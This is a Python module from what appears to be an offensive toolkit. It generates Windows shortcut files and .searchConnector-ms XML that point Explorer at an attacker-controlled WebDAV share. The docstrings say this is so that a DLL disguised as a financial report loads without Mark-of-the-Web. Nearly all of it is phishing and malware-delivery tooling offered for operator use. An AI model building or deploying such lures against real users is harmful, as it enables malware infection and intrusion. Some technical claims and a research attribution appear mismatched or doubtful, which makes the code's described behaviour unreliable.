"""search-ms protocol LNK / searchConnector-ms builder.

Generates Windows shortcut (``.lnk``) files that embed a ``search-ms:``
query URL and companion ``.searchConnector-ms`` XML files.  When the victim
opens the LNK, Explorer parses the ``search-ms`` query, connects to the
attacker WebDAV server, lists the remote folder, and loads a payload DLL —
executing it *without* a Mark-of-the-Web because the content is fetched
over the network rather than written from a downloaded container.

Technique (per the gap analysis): the LNK points to
``search-ms:query=<webdav_url>\\*`` and the ``.searchConnector-ms`` defines
a WebDAV provider pointing at the attacker URL.  Explorer renders the remote
folder as a local search result, and a disguised DLL loaded from it runs
without the MOTW/Zone.Identifier that gate normal downloads.

For authorized red-team / phishing-simulation use only.  Operators must
host a payload DLL on the WebDAV share named to masquerade as a benign
document (e.g. ``Q3-2026-Financials.dll``) and configure the WebDAV server
(see ``dropoutjeep`` WebDAV integration).

References: search-ms protocol handler, .searchConnector-ms schema,
MS-SHLLINK (Shell Link Binary File Format), Stivvie's Dirty Vanity / search-ms research.
"""

from __future__ import annotations

import os
import struct
import logging
import xml.sax.saxutils as saxutils
from typing import Optional

logger = logging.getLogger('dropoutjeep')

# --- LNK constants -------------------------------------------------------

# Shell Link header CLSID: {00021401-0000-0000-C000-000000000046}
LNK_CLSID = bytes.fromhex('0002140100000000c000000000000046')

# LNK header size (offset past the fixed 76-byte ShellLinkHeader).
LNK_HEADER_SIZE = 0x0000004C

# Header flags (MS-SHLLINK LinkFlags).
FLAG_HAS_TARGET_IDLIST = 0x00000001
FLAG_HAS_LINK_INFO = 0x00000002
FLAG_HAS_NAME = 0x00000004          # NAME_STRING (comment / display name)
FLAG_HAS_RELATIVE_PATH = 0x00000008
FLAG_HAS_WORKING_DIR = 0x00000010
FLAG_HAS_ARGUMENTS = 0x00000020     # COMMAND_LINE_ARGUMENTS
FLAG_HAS_ICON_LOCATION = 0x00000040
FLAG_IS_UNICODE = 0x00000080        # StringData is UTF-16LE

# ShowCommand values (WindowStyle).
SW_SHOWNORMAL = 0x00000001
SW_SHOWMINNOACTIVE = 0x00000007

# Sentinel for "no sibling" / "no child" in shell item ID lists.
NOSTREAM = 0xFFFFFFFF

# Shell item signatures / known folder CLSIDs for the item ID list.
SIG_ROOT = 0x1F                     # root shell folder item
# My Computer (This PC) CLSID: {20D04FE0-3AEA-1069-A2D8-08002B30309D}
CLSID_MY_COMPUTER = bytes.fromhex('20d04fe03aea1069a2d808002b30309d')
# Search Results CLSID: {1F4DE370-D647-4d60-B55D-4E1A85FBAE7E}
CLSID_SEARCH_RESULTS = bytes.fromhex('1f4de370d6474d60b55d4e1a85fbae7e')


# --- helpers -------------------------------------------------------------

def _filetime_now() -> int:
    """Return a zero FILETIME (unset) — avoids leaking build timestamps."""
    return 0


def _pack_idlist_root() -> bytes:
    """Build a minimal, valid shell item ID list (root + terminator).

    A single root shell-folder item (My Computer) followed by the 16-bit
    ``0x0000`` list terminator.  This keeps the LNK structurally valid;
    Explorer derives the actual launch behaviour from the search-ms
    arguments rather than the IDList target.
    """
    # SHITEMID: cb (2, includes cb) + data. data = signature + CLSID.
    item_data = bytes([SIG_ROOT]) + CLSID_MY_COMPUTER
    cb = 2 + len(item_data)
    item = struct.pack('<H', cb) + item_data
    terminator = struct.pack('<H', 0x0000)
    # The IDList is prefixed by its total size (incl. terminator).
    idlist = item + terminator
    return struct.pack('<H', 2 + len(idlist)) + idlist


def _unicode_string(text: str) -> bytes:
    """Counted UTF-16LE string: 2-byte char-count + UTF-16LE bytes."""
    encoded = text.encode('utf-16-le')
    return struct.pack('<H', len(text)) + encoded


# --- public API -----------------------------------------------------------

def build_lnk_raw(target_url: str, description: str | None = None) -> bytes:
    """Build a raw LNK file structure (header + shell item ID list).

    The LNK launches Explorer with ``target_url`` as its command-line
    arguments.  For the search-ms technique, ``target_url`` should be a
    ``search-ms:query=...`` URL (see :func:`build_search_ms_lnk`).

    Args:
        target_url: full command-line argument string (e.g. the search-ms URL).
        description: optional display name / comment stored in NAME_STRING.

    Returns:
        The raw LNK file as bytes.
    """
    flags = (
        FLAG_HAS_TARGET_IDLIST
        | FLAG_HAS_ARGUMENTS
        | FLAG_IS_UNICODE
    )
    if description:
        flags |= FLAG_HAS_NAME

    header = bytearray(LNK_HEADER_SIZE)
    struct.pack_into('<I', header, 0x00, LNK_HEADER_SIZE)   # cbSize
    header[0x04:0x14] = LNK_CLSID                            # clsid
    struct.pack_into('<I', header, 0x14, flags)               # dwFlags
    struct.pack_into('<I', header, 0x18, 0x00000080)          # dwFileAttributes (NORMAL)
    struct.pack_into('<Q', header, 0x1C, _filetime_now())     # CreationTime
    struct.pack_into('<Q', header, 0x24, _filetime_now())     # AccessTime
    struct.pack_into('<Q', header, 0x2C, _filetime_now())     # WriteTime
    struct.pack_into('<I', header, 0x34, 0x00000000)          # nFileSize (placeholder)
    struct.pack_into('<I', header, 0x38, 0x00000000)          # iIcon
    struct.pack_into('<I', header, 0x3C, SW_SHOWMINNOACTIVE)  # dwShowCommand
    struct.pack_into('<H', header, 0x40, 0x0000)               # wHotKey
    struct.pack_into('<H', header, 0x42, 0x0000)              # Reserved1
    struct.pack_into('<I', header, 0x44, 0x00000000)          # Reserved2
    struct.pack_into('<I', header, 0x48, 0x00000000)          # Reserved3

    body = bytearray()
    # LinkTargetIDList (present because FLAG_HAS_TARGET_IDLIST).
    body += _pack_idlist_root()

    # StringData (order: NAME, RELATIVE_PATH, WORKING_DIR, ARGUMENTS, ICON).
    if description:
        body += _unicode_string(description)        # NAME_STRING
    body += _unicode_string(target_url)              # COMMAND_LINE_ARGUMENTS

    lnk = bytes(header) + bytes(body)
    logger.info('built raw LNK (%d bytes) args=%s', len(lnk), target_url)
    return lnk


def build_search_ms_lnk(webdav_url: str,
                        output_path: str | None = None) -> bytes:
    """Generate a LNK file that uses the search-ms protocol.

    The LNK's arguments are set to ``search-ms:query=<webdav_url>\\*`` so
    that opening it makes Explorer connect to the attacker WebDAV share,
    render its contents as search results, and load any payload DLL found
    there without a Mark-of-the-Web.

    Args:
        webdav_url: attacker WebDAV share URL (e.g. ``\\\\attacker@80\\share``).
        output_path: optional path to write the generated LNK to disk.

    Returns:
        The LNK file as bytes.
    """
    # Normalise backslashes for the UNC path form expected by Explorer.
    url = webdav_url.replace('/', '\\')
    query = f'search-ms:query={url}\\*'
    description = 'Search Results'
    data = build_lnk_raw(target_url=query, description=description)

    if output_path:
        with open(output_path, 'wb') as fh:
            fh.write(data)
        logger.info('wrote search-ms LNK to %s', output_path)

    return data


def build_search_connector_ms(webdav_url: str,
                              output_path: str | None = None) -> str:
    """Generate a ``.searchConnector-ms`` XML file pointing at ``webdav_url``.

    The connector declares a WebDAV search provider whose location is the
    attacker URL.  When Explorer opens this connector (directly or via the
    search-ms LNK) it treats the remote WebDAV folder as a local search
    scope and renders its contents, allowing a hosted DLL to be loaded and
    executed without MOTW.

    Args:
        webdav_url: attacker WebDAV URL (e.g. ``http://attacker/webdav/``).
        output_path: optional path to write the XML to disk.

    Returns:
        The ``.searchConnector-ms`` document as a string.
    """
    if not webdav_url:
        raise ValueError('webdav_url is required')

    # Use http(s) form for the simpleLocation URL (Explorer prefers this).
    location_url = webdav_url if webdav_url.lower().startswith(('http://', 'https://')) \
        else 'http://' + webdav_url.replace('\\', '/')
    if not location_url.endswith('/'):
        location_url += '/'

    safe_url = saxutils.escape(location_url)
    # Folder type GUID for "Generic" search results.
    folder_type = '{5C4F28B5-F869-4E84-983F-3099189B49C5}'

    xml = f"""<?xml version="1.0" encoding="UTF-8"?>
<searchConnectorDescriptionList xmlns="http://schemas.microsoft.com/windows/2009/searchConnector">
  <searchConnectorDescription>
    <isSearchOnlyItem>false</isSearchOnlyItem>
    <description>Search results</description>
    <iconReference>shell32.dll,-10029</iconReference>
    <templateInfo>
      <folderType>{folder_type}</folderType>
    </templateInfo>
    <simpleLocation>
      <url>{safe_url}</url>
    </simpleLocation>
    <scope>
      <scopeItem>
        <mode>Include</mode>
        <depth>Deep</depth>
        <url>{safe_url}</url>
      </scopeItem>
    </scope>
  </searchConnectorDescription>
</searchConnectorDescriptionList>
"""
    logger.info('built .searchConnector-ms (%d bytes) -> %s', len(xml), location_url)

    if output_path:
        with open(output_path, 'w', encoding='utf-8') as fh:
            fh.write(xml)
        logger.info('wrote .searchConnector-ms to %s', output_path)

    return xml
